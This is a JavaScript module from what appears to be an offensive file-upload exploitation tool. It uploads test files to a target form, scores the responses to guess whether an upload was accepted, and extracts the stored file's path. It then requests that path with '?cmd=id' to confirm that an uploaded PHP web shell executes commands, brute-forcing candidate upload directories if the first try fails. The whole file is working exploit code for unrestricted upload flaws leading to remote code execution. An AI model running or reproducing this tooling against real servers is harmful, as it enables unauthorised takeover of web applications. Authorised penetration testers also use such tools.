import { request, red, green, PHP_PAYLOAD, allowedExt,bruteDirs } from './config.mjs';
import { brute } from './fuzzer.mjs';
export async function getBaseResponse() {
    const baselinePayload = new FormData();
    baselinePayload.append(request.formDataName, new Blob(["PNG"], { type: request.contentType }), "test" + allowedExt);

    try {
        const res = await fetch(request.url, { method: request.method, body: baselinePayload });

        // Check if response is ok
        if (!res.ok) {
            console.log(`[-] Baseline request failed: ${res.status} ${res.statusText}`);
            return null;
        }

        const baselineText = await res.text();

        // Check if we got actual content
        if (!baselineText) {
            console.log(`[-] Baseline response is empty`);
            return null;
        }

        return baselineText;
    } catch (e) {
        console.log(`[-] Error getting baseline: ${e.message}`);
        return null;
    }
}


export function analyzeUpload(baseline, uploaded, filename) {
    const signals = {};
    let triggeredCount = 0;

    // FIRST: Check for explicit rejection (this disqualifies immediately)
    const rejectPattern = /not allow|reject|invalid|denied|forbidden/i;
    if (rejectPattern.test(uploaded)) {
        return {
            isSuccessful: false,
            confidence: 0,
            triggeredSignals: ['REJECTED'],
            signals: { rejection: uploaded }
        };
    }

    const strongSuccess = /uploaded successfully|File uploaded/i;
    if (strongSuccess.test(uploaded)) {
        return {
            isSuccessful: true,
            confidence: 6,
            triggeredSignals: ['STRONG_SUCCESS_TEXT'],
            signals
        };
    }


    // Signal 1: Content Length Delta
    signals.contentLengthDelta = Math.abs(uploaded.length - baseline.length);
    if (signals.contentLengthDelta > 50) {
        triggeredCount++;
    }

    // Signal 2: Success Keywords
    const successPattern = /success|upload|accept|file|saved|stored/i;
    signals.hasSuccessKeywords = successPattern.test(uploaded);
    if (signals.hasSuccessKeywords) {
        triggeredCount++;
    }

    // Signal 3: Filename Echo
    const filenameBase = filename.split('.')[0];
    signals.filenameEchoed = uploaded.includes(filenameBase);
    if (signals.filenameEchoed) {
        triggeredCount++;
    }

    // Signal 4: File path in response (images/filename pattern)
    const filePathPattern = new RegExp(`images\\/[^<>\\s"]*${filenameBase}`, 'i');
    signals.hasFilePath = filePathPattern.test(uploaded);
    if (signals.hasFilePath) {
        triggeredCount++;
    }

    // Signal 5: Unique new words
    const baselineWords = new Set((baseline.match(/\w+/g) || []).map(w => w.toLowerCase()));
    const uploadedWords = (uploaded.match(/\w+/g) || []).map(w => w.toLowerCase());
    const uniqueWords = uploadedWords.filter(w => !baselineWords.has(w));
    signals.newUniqueWords = uniqueWords.length;
    if (uniqueWords.length > 5) {
        triggeredCount++;
    }

    const confidence = Math.max(0, Math.min(10, triggeredCount));

    return {
        isSuccessful: triggeredCount >= 3, // All 3+ signals indicate success
        confidence,
        triggeredSignals: Object.entries(signals)
            .filter(([key, val]) => {
                if (key === 'contentLengthDelta') return val > 50;
                if (key === 'hasSuccessKeywords') return val;
                if (key === 'filenameEchoed') return val;
                if (key === 'hasFilePath') return val;
                if (key === 'newUniqueWords') return val > 5;
                return false;
            })
            .map(([key]) => key),
        signals
    };
}

export async function extractUploadPath(response, filename) {
    const filenameBase = filename.split('.')[0];
    const fileExt = filename.split('.').pop();

    // Strategy 1: Look for the exact filename in quotes or href
    const exactMatch = response.match(/["']([^"']*\/[^"']*)/g);
    if (exactMatch) {
        for (let match of exactMatch) {
            if (match.includes(filenameBase)) {
                return match.replace(/["']/g, '');
            }
        }
    }

    // Strategy 2: Look for common upload directory patterns
    const pathPatterns = [
        /(?:href|src)=["']([^"']*(?:upload|image|file|asset)[^"']*)/gi,
        /(?:href|src)=["']([^"']*\/[^"']*\.(?:jpg|gif|png|php|pdf))/gi,
        /['"](\/[^'"]*\/[^'"]*\.(?:jpg|gif|png|php|pdf))['"]/gi,
    ];

    for (let pattern of pathPatterns) {
        let match;
        while ((match = pattern.exec(response)) !== null) {
            const path = match[1];
            // Check if it looks like it could be our file
            if (path.includes(filenameBase) || path.endsWith(fileExt)) {
                return path;
            }
        }
    }

    // Strategy 3: Extract all URLs/paths and score them
    const allPaths = response.match(/(?:href|src)=["']([^"']+)["']/g) || [];
    const candidates = allPaths
        .map(m => m.replace(/(?:href|src)=["']/g, '').replace(/["']/g, ''))
        .filter(p => p.includes('/') && !p.startsWith('http'));

    // Score paths by likelihood
    const scored = candidates.map(path => ({
        path,
        score: (
            (path.includes(filenameBase) ? 10 : 0) +
            (path.includes(fileExt) ? 5 : 0) +
            (path.includes('upload') ? 3 : 0) +
            (path.includes('image') ? 3 : 0) +
            (path.includes('file') ? 2 : 0) +
            (path.startsWith('/') ? 1 : 0)
        )
    }));

    if (scored.length > 0) {
        scored.sort((a, b) => b.score - a.score);
        return scored[0].path;
    }

    return null;
}

export async function verifyUploadPath(filename, baseUrl, uploadPath, payload = PHP_PAYLOAD) {
    if (!uploadPath) {
        uploadPath = filename
    }

    let success = false
    try {
        const fullUrl = new URL(uploadPath, baseUrl).href;
        console.log(`   Verifying upload path: ${fullUrl + "?cmd=id"}`);
        const res = await fetch(fullUrl + "?cmd=id");
        let body = await res.text();
        
        console.log(res.status);
        console.log(brute);
        // if 404
        console.log(body.startsWith("<!DOCTYPE"))
        console.log(res.status === 404)
        if (body.startsWith("<!DOCTYPE") || res.status === 404 ) {
            if (brute === false) {
                return { accessible: false, success: false, statusCode: 404 };
            }
            for (const dir of bruteDirs) {
                const bruteUrl = new URL(dir + uploadPath.split('/').pop(), baseUrl).href;
                console.log(`   Trying brute-force path: ${bruteUrl + "?cmd=id"}`);
                const bruteRes = await fetch(bruteUrl + "?cmd=id");
                body = await bruteRes.text();
                if (bruteRes.status !== 404) {
                    console.log(green(`   Found upload at: ${bruteUrl}`));
                    if (body != payload) {
                        console.log(green("   'id' Command executed, upload successful!"));
                        console.log(green(`   Response: ${body.slice(0, 80)}`));
                        success = true;
                    } else {
                        console.log(red("   'id' Command not executed, upload likely failed."));
                    }
                    return {
                        accessible: bruteRes.status === 200,
                        success: success,
                        statusCode: bruteRes.status,
                        url: bruteUrl,
                        contentType: bruteRes.headers.get('content-type'),
                    };
                }
            }
            console.log(red("   Upload path not found (404) after brute-force attempts."));
            return { accessible: false, success: false, statusCode: 404 };
        }

        if (body == payload) {
            console.log(red("   'id' Command not executed, upload likely failed."));
        } else {
            console.log(green("   'id' Command executed, upload successful!"));
            console.log(green(`   Response: ${body.slice(0, 80)}`));
            success = true;
        }

        return {
            accessible: res.status === 200,
            success: success,
            statusCode: res.status,
            url: fullUrl,
            contentType: res.headers.get('content-type'),
        };
    } catch (e) {
        return { accessible: false, error: e.message };
    }
}